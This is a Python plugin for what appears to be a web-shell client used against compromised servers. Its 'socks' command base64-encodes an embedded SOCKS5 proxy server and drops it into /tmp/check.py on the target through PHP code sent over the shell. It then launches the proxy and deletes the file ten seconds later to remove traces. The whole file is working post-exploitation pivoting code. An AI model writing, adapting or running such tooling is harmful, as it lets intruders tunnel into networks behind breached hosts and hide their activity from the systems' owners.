from libs.config import alias, color
from libs.myapp import send, delay_send, is_windows, has_env, get_system_code, base64_encode
from threading import Thread
from time import sleep


def get_python(port):
    return """import socket, sys, select, struct, threading
from time import sleep
from sys import version_info
server = None
try:
    if(version_info.major == 2):
        import SocketServer
    else:
        import socketserver as SocketServer
except:
    pass

class ThreadingTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer): pass

class Socks5Server(SocketServer.StreamRequestHandler):
    def handle_tcp(self, sock, remote):
        fdset = [sock, remote]
        while True:
            r, w, e = select.select(fdset, [], [])
            if sock in r:
                if remote.send(sock.recv(4096)) <= 0: break
            if remote in r:
                if sock.send(remote.recv(4096)) <= 0: break

    def getversion_(self):
        return version_info.major == 3

    def handle(self):
        try:
            pass  # print 'from ', self.client_address nothing to do.
            sock = self.connection
            # 1. Version
            sock.recv(262)
            version = "\\x05\\x00".encode('latin1') if self.getversion_() else "\\x05\\x00"
            sock.send(version)
            # 2. Request
            data = self.rfile.read(4)
            mode = data[1] if self.getversion_() else ord(data[1])
            addrtype = data[3] if self.getversion_() else ord(data[3])
            if addrtype == 1:  # IPv4
                addr = socket.inet_ntoa(self.rfile.read(4))
            elif addrtype == 3:  # Domain name
                addr = self.rfile.read(ord(sock.recv(1)[0]))
            port = struct.unpack('>H', self.rfile.read(2))
            reply = "\\x05\\x00\\x00\\x01"
            try:
                if mode == 1:  # 1. Tcp connect
                    remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    remote.connect((addr, port[0]))
                    pass  # print 'To', addr, port[0] nothing do to.
                else:
                    reply = "\\x05\\x07\\x00\\x01"  # Command not supported
                local = remote.getsockname()
                reply += socket.inet_aton(local[0]).decode('latin1') + struct.pack(">H", local[1]).decode('latin1') if self.getversion_() else socket.inet_aton(local[0]) + struct.pack(">H", local[1])
            except socket.error:
                # Connection refused
                reply = '\\x05\\x05\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00'
            reply = reply.encode('latin1') if self.getversion_() else reply
            sock.send(reply)
            # 3. Transfering
            if reply[1] == '\\x00' or reply[1] == 0:  # Success
                if mode == 1:  # 1. Tcp connect
                    self.handle_tcp(sock, remote)
        except socket.error:
            pass  # print 'error' nothing to do .
        except IndexError:
            pass

def run_self():
    global server
    socks_port = %s
    server = ThreadingTCPServer(('', socks_port), Socks5Server)
    server.serve_forever()


def main():
    global server
    run_ = threading.Thread(target=run_self)
    run_.setDaemon(daemonic=True)
    run_.start()

main()""" % port


@alias(True, _type="OTHER")
def run(port: int = 8888):
    """
    socks

    (Only for *unix) Run a socks5 server on the target system by python.

    eg: socks {port=8888}
    """
    if (is_windows()):
        print(color.red("Target system isn't *unix"))
        return
    flag = has_env("python")
    if flag:
        python = get_python(port)
        pyname = "check.py"
        res = send(f"print(file_put_contents('/tmp/{pyname}', base64_decode(\"{base64_encode(python)}\")));")
        if (not res):
            return
        text = res.r_text.strip()
        if not len(text):
            print(color.red("Failed to write file in /tmp directory."))
            return
        t = Thread(target=send, args=(get_system_code(f"python /tmp/{pyname}"),))
        t.setDaemon(True)
        t.start()
        t2 = Thread(
            target=delay_send, args=(10.0, f"unlink('/tmp/{pyname}');",)
        )
        t2.setDaemon(True)
        t2.start()
        sleep(1)
        if (t.isAlive()):
            print(f"\nStart socks5 server listen on {port} {color.green('success')}.\n")
        else:
            print(f"\nStart socks5 server {color.red('error')}.\n")
    else:
        print(
            color.red(
                "The target host does not exist or cannot be found in the python environment."
            )
        )
